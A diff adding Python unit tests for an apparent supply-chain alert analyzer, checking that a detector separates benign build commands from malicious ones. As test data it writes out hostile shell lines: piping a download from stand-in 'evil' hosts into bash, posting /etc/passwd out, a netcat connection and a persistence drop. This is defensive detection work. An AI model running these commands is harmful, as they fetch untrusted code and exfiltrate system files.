@@ -117,3 +117,32 @@ def test_runtime_decodes_echo_base64_payloads():
     benign = "echo 'bm90aWNlOiBidWlsZCBvaw==' | base64 -d > notice.txt"
     assert la.decoded_payloads(benign) == ["notice: build ok"]
     assert la.decoded_payloads("echo '!!!' | base64 -d") == []
+
+
+def test_malicious_effect_separates_fetch_from_execute():
+    benign = 'curl -o "$srcdir/helper.pem" https://example.com/helper.pem'
+    assert not la.has_malicious_effect(benign)
+    assert not la.has_malicious_effect("make DESTDIR=$pkgdir install")
+    assert not la.has_malicious_effect("source /etc/profile")
+    assert la.has_malicious_effect("curl https://evil.sh | bash")
+    assert la.has_malicious_effect("echo 'Y3VybA==' | base64 -d | bash")
+    assert la.has_malicious_effect("curl -s -d @/etc/passwd https://evil")
+    assert la.has_malicious_effect("curl https://evil/x > /etc/profile.d/x.sh")
+    assert la.has_malicious_effect("nc 10.0.0.1 4444")
+    assert la.has_malicious_effect("curl -o /tmp/x https://evil; bash /tmp/x")
+    assert la.has_malicious_effect("chmod +x evil.sh && ./evil.sh")
+    assert la.has_malicious_effect("python3 stage.py")
+
+
+def test_package_evidence_excludes_the_suspicion():
+    class NoHub:
+        async def call(self, *args, **kwargs):
+            raise AssertionError("no MCP expected")
+
+    alert = json.loads(
+        (FIXTURES / "alert_tp_synthetic_benign.json").read_text())
+    text = asyncio.run(la.Snapshot(NoHub(), alert).package_evidence())
+    assert "curl -o" in text
+    assert "pipeline metadata" not in text
+    assert "pipeline candidate" not in text
+    assert not la.has_malicious_effect(text)
